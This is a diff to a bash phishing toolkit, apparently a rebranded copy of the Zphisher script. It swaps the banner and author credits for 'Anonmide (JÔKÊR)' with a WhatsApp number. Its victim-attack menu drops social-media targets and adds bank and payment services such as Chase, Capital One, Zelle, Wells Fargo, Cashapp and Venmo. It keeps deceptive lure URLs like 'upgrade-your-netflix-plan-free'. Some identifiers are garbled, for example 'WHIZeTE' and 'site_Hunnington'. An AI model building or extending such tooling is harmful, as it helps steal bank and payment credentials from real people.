@@ -138,25 +138,25 @@ kill_pid() {
 banner() {
 	cat <<- EOF
 		${ORANGE}
-		${ORANGE} ______      _     _     _               
-		${ORANGE}|___  /     | |   (_)   | |              
-		${ORANGE}   / / _ __ | |__  _ ___| |__   ___ _ __ 
-		${ORANGE}  / / | '_ \| '_ \| / __| '_ \ / _ \ '__|
-		${ORANGE} / /__| |_) | | | | \__ \ | | |  __/ |   
-		${ORANGE}/_____| .__/|_| |_|_|___/_| |_|\___|_|   
-		${ORANGE}      | |                                
-		${ORANGE}      |_|                ${RED}Version : 2.1
-		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by htr-tech (tahmid.rayat)${WHITE}
+		${ORANGE}  ______          
+		${ORANGE} |       \   __    __   __   ______   __    __   __       ______   ______
+		${ORANGE} |  ° °   | |  |  |  | |  | |    __| |  |  |  | |  |     |  __  | |  ____|
+		${ORANGE} |  ° °   | |  |__|  | |  | |    \   |  |__|  | |  |     | |  | | | |  __
+		${ORANGE} |   ___ /  |   __   | |  |  \    \  |   __   | |  |     | |  | | | |    |
+		${ORANGE} |  |       |  |  |  | |  |  _\    | |  |  |  | |  |___  | |__| | | |__| |
+		${ORANGE} |  |       |__|  |__| |__| |______| |__|  |__| |______| |______| |______|           
+		${ORANGE} |__|                       ${RED}Version : 1.0
+		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by Anonmide (JÔKÊR)${WHITE}
 	EOF
 }
 
 ## Small Banner
 banner_small() {
 	cat <<- EOF
-		${BLUE} $$$$ $  $ $ $$$$
-		${BLUE} $  $ $__$ $ $__
-		${BLUE} $$$$ $  $ $    $
-		${BLUE} $    $  $ $ $$$$          ${WHITE} 2.1
+		${BLUE} $$$$ $   $ $ $$$$ $   $ $     $$$$$ $$$$$
+		${BLUE} $  $ $___$ $ $__  $___$ $     $   $ $ __
+		${BLUE} $$$$ $   $ $    $ $   $ $     $   $ $   $
+		${BLUE} $    $   $ $ $$$$ $   $ $$$$$ $$$$$ $$$$$      ${WHITE} 2.1
 	EOF
 }
 
@@ -243,7 +243,7 @@ install_ngrok() {
 ## Exit message
 msg_exit() {
 	{ clear; banner; echo; }
-	echo -e "${GREENBG}${BLACK} Thank you for using this tool. Have a good day.${RESETBG}\n"
+	echo -e "${GREENBG}${BLACK} Thank you for using this tool. Hope you had fun.${RESETBG}\n"
 	{ reset_color; exit 0; }
 }
 
@@ -251,12 +251,12 @@ msg_exit() {
 about() {
 	{ clear; banner; echo; }
 	cat <<- EOF
-		${GREEN}Author   ${RED}:  ${ORANGE}TAHMID RAYAT ${RED}[ ${ORANGE}HTR-TECH ${RED}]
-		${GREEN}Github   ${RED}:  ${CYAN}https://github.com/htr-tech
-		${GREEN}Social   ${RED}:  ${CYAN}https://linktr.ee/tahmid.rayat
-		${GREEN}Version  ${RED}:  ${ORANGE}2.1
-		${REDBG}${WHITE} Thanks : Adi1090x,MoisesTapia,ThelinuxChoice
-								  DarkSecDevelopers,Mustakim Ahmed ${RESETBG}
+		${GREEN}Author   ${RED}:  ${ORANGE} JÔKÊR ${RED}[ ${ORANGE}HTR-TECH ${RED}]
+		${GREEN}Github   ${RED}:  ${CYAN}https://github.com/Anonmide
+		${GREEN}WhatsApp   ${RED}:  ${CYAN}07034232972
+		${GREEN}Version  ${RED}:  ${ORANGE}1.0
+		${REDBG}${WHITE} Thanks : #ung€®
+								  $@¶@ ${RESETBG}
 		${RED}[${WHITE}00${RED}]${ORANGE} Main Menu     ${RED}[${WHITE}99${RED}]${ORANGE} Exit
 	EOF
 
@@ -268,7 +268,7 @@ about() {
 		echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Returning to main menu..."
 		{ sleep 1; main_menu; }
 	else
-		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Are you sure. Invalid Option, Try Again..."
 		{ sleep 1; about; }
 	fi
 }
@@ -496,31 +496,29 @@ main_menu() {
 	{ clear; banner; echo; }
 	cat <<- EOF
 		${RED}[${WHITE}::${RED}]${ORANGE} Select An Attack For Your Victim ${RED}[${WHITE}::${RED}]${ORANGE}
-		${RED}[${WHITE}01${RED}]${ORANGE} Facebook      ${RED}[${WHITE}11${RED}]${ORANGE} Twitch       ${RED}[${WHITE}21${RED}]${ORANGE} DeviantArt
-		${RED}[${WHITE}02${RED}]${ORANGE} Instagram     ${RED}[${WHITE}12${RED}]${ORANGE} Pinterest    ${RED}[${WHITE}22${RED}]${ORANGE} Badoo
-		${RED}[${WHITE}03${RED}]${ORANGE} Google        ${RED}[${WHITE}13${RED}]${ORANGE} Snapchat     ${RED}[${WHITE}23${RED}]${ORANGE} Origin
-		${RED}[${WHITE}04${RED}]${ORANGE} Microsoft     ${RED}[${WHITE}14${RED}]${ORANGE} Linkedin     ${RED}[${WHITE}24${RED}]${ORANGE} DropBox	
-		${RED}[${WHITE}05${RED}]${ORANGE} Netflix       ${RED}[${WHITE}15${RED}]${ORANGE} Ebay         ${RED}[${WHITE}25${RED}]${ORANGE} Yahoo		
-		${RED}[${WHITE}06${RED}]${ORANGE} Paypal        ${RED}[${WHITE}16${RED}]${ORANGE} Quora        ${RED}[${WHITE}26${RED}]${ORANGE} Wordpress
-		${RED}[${WHITE}07${RED}]${ORANGE} Steam         ${RED}[${WHITE}17${RED}]${ORANGE} Protonmail   ${RED}[${WHITE}27${RED}]${ORANGE} Yandex			
-		${RED}[${WHITE}08${RED}]${ORANGE} Twitter       ${RED}[${WHITE}18${RED}]${ORANGE} Spotify      ${RED}[${WHITE}28${RED}]${ORANGE} StackoverFlow
-		${RED}[${WHITE}09${RED}]${ORANGE} Playstation   ${RED}[${WHITE}19${RED}]${ORANGE} Reddit       ${RED}[${WHITE}29${RED}]${ORANGE} Vk
-		${RED}[${WHITE}10${RED}]${ORANGE} Tiktok        ${RED}[${WHITE}20${RED}]${ORANGE} Adobe        ${RED}[${WHITE}30${RED}]${ORANGE} XBOX
-		${RED}[${WHITE}31${RED}]${ORANGE} Mediafire     ${RED}[${WHITE}32${RED}]${ORANGE} Gitlab       ${RED}[${WHITE}33${RED}]${ORANGE} Github
-		${RED}[${WHITE}99${RED}]${ORANGE} About         ${RED}[${WHITE}00${RED}]${ORANGE} Exit
+		${RED}[${WHITE}01${RED}]${ORANGE} Huntington      ${RED}[${WHITE}11${RED}]${ORANGE} BOA              ${RED}[${WHITE}21${RED}]${ORANGE} DeviantArt
+		${RED}[${WHITE}02${RED}]${ORANGE} Chase           ${RED}[${WHITE}12${RED}]${ORANGE} Citibank         ${RED}[${WHITE}22${RED}]${ORANGE} Badoo
+		${RED}[${WHITE}03${RED}]${ORANGE} Capital one     ${RED}[${WHITE}13${RED}]${ORANGE} Fifth third      ${RED}[${WHITE}23${RED}]${ORANGE} Origin
+		${RED}[${WHITE}04${RED}]${ORANGE} Zelle           ${RED}[${WHITE}14${RED}]${ORANGE} American Express ${RED}[${WHITE}24${RED}]${ORANGE} DropBox	
+		${RED}[${WHITE}05${RED}]${ORANGE} Shopwithscript  ${RED}[${WHITE}15${RED}]${ORANGE} SunTrust         ${RED}[${WHITE}25${RED}]${ORANGE} Yahoo		
+		${RED}[${WHITE}06${RED}]${ORANGE} Paypal          ${RED}[${WHITE}16${RED}]${ORANGE} Chime            ${RED}[${WHITE}26${RED}]${ORANGE} Wordpress
+		${RED}[${WHITE}07${RED}]${ORANGE} Jumia           ${RED}[${WHITE}17${RED}]${ORANGE} Ally             ${RED}[${WHITE}27${RED}]${ORANGE} Yandex			
+		${RED}[${WHITE}08${RED}]${ORANGE} NavyFed         ${RED}[${WHITE}18${RED}]${ORANGE} Cashapp          ${RED}[${WHITE}28${RED}]${ORANGE} StackoverFlow
+		${RED}[${WHITE}09${RED}]${ORANGE} Kuda            ${RED}[${WHITE}19${RED}]${ORANGE} Venmo            ${RED}[${WHITE}29${RED}]${ORANGE} Vk
+		${RED}[${WHITE}10${RED}]${ORANGE} Gobank          ${RED}[${WHITE}20${RED}]${ORANGE} Payonneer        ${RED}[${WHITE}30${RED}]${ORANGE} XBOX
+		${RED}[${WHITE}31${RED}]${ORANGE} Wells Fargo     ${RED}[${WHITE}32${RED}]${ORANGE} Gitlab           ${RED}[${WHITE}33${RED}]${ORANGE} Github
+		${RED}[${WHITE}99${RED}]${ORANGE} About         ${RED}[${WHIZeTE}00${RED}]${ORANGE} Exit
 	EOF
 	
 	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
 if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
-		site_facebook
+		site_Hunnington
 	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
-		site_instagram
+		site_Chase
 	elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; then
-		site_gmail
+		site_Capital-one
 	elif [[ "$REPLY" == 4 || "$REPLY" == 04 ]]; then
-		website="microsoft"
-		mask='http://unlimited-onedrive-space-for-free'
-		tunnel_menu
+		site_Zelle
 	elif [[ "$REPLY" == 5 || "$REPLY" == 05 ]]; then
 		website="netflix"
 		mask='http://upgrade-your-netflix-plan-free'
